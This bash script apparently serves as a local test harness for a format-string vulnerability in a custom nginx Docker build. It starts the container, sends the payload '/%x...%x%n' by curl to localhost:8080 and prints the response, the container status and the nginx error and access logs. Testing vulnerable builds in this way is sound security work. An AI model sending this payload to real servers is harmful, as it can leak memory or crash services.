#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}=== Building Docker image ===${NC}"
docker build -t nginx-format-string .

if [ $? -ne 0 ]; then
    echo -e "${RED}Docker build failed${NC}"
    exit 1
fi

echo -e "${GREEN}Docker image built successfully${NC}"

echo -e "${YELLOW}=== Starting Docker container ===${NC}"
docker run -d --name nginx-test -p 8080:80 nginx-format-string

if [ $? -ne 0 ]; then
    echo -e "${RED}Failed to start container${NC}"
    exit 1
fi

echo -e "${GREEN}Container started successfully${NC}"

# Wait for Nginx to start
echo -e "${YELLOW}Waiting for Nginx to start...${NC}"
sleep 2

# Test payload
PAYLOAD="/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n"

echo -e "${YELLOW}=== Testing format string vulnerability ===${NC}"
echo -e "${YELLOW}Sending payload: $PAYLOAD${NC}"

# Send request and capture response with verbose output
echo -e "${YELLOW}=== Sending request with verbose output ===${NC}"
curl -v -s -w "\n%{http_code}" "http://localhost:8080$PAYLOAD" 2>&1

# Send request again to capture response
RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:8080$PAYLOAD")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo -e "\n${YELLOW}=== Response Details ===${NC}"
echo -e "Response code: ${HTTP_CODE}"
echo -e "Response body:"
echo "$BODY"

# Check container status
echo -e "\n${YELLOW}=== Container Status ===${NC}"
docker ps -a | grep nginx-test

# Check container logs
echo -e "\n${YELLOW}=== Container Logs ===${NC}"
docker logs nginx-test

# Check error logs inside container
echo -e "\n${YELLOW}=== Nginx Error Logs ===${NC}"
docker exec nginx-test cat /usr/local/nginx/logs/error.log

# Check access logs inside container
echo -e "\n${YELLOW}=== Nginx Access Logs ===${NC}"
docker exec nginx-test cat /usr/local/nginx/logs/access.log

# Stop and remove container
echo -e "\n${YELLOW}=== Cleaning up ===${NC}"
docker stop nginx-test
docker rm nginx-test

echo -e "${GREEN}=== Test complete ===${NC}" 